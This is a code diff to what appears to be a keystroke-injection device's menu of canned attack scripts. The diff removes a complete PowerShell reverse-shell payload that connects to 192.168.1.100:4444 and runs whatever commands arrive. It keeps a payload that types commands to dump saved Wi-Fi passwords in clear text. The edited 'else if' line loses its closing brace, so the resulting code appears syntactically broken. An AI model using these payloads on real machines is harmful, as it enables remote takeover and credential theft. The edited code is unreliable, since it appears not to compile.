@@ -2768,7 +2768,6 @@ String getScriptFromUser() {
     scripts[scriptCount++] = "Example: Open Calculator";
     scripts[scriptCount++] = "Example: Open CMD/Terminal";
     scripts[scriptCount++] = "Example: WiFi Credentials";
-    scripts[scriptCount++] = "Example: Reverse Shell";
     scripts[scriptCount++] = "Example: Rickroll";
     scripts[scriptCount++] = "Load from SD";
     scripts[scriptCount++] = "Cancel";
@@ -2868,16 +2867,7 @@ String getScriptFromUser() {
                 } else if (scriptName == "WiFi Credentials") {
                     return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan "
                            "show profile name=* key=clear\nDELAY 300\nENTER";
-                } else if (scriptName == "Reverse Shell") {
-                    return "GUI r\nDELAY 500\nSTRING powershell -w h -NoP -NonI -Exec Bypass $client = "
-                           "New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = "
-                           "$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = "
-                           "$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName "
-                           "System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | "
-                           "Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = "
-                           "([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$"
-                           "sendbyte.Length);$stream.Flush()};$client.Close()\nENTER";
-                } else if (scriptName == "Rickroll") {
+                else if (scriptName == "Rickroll") {
                     return "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY "
                            "300\nENTER";
                 }
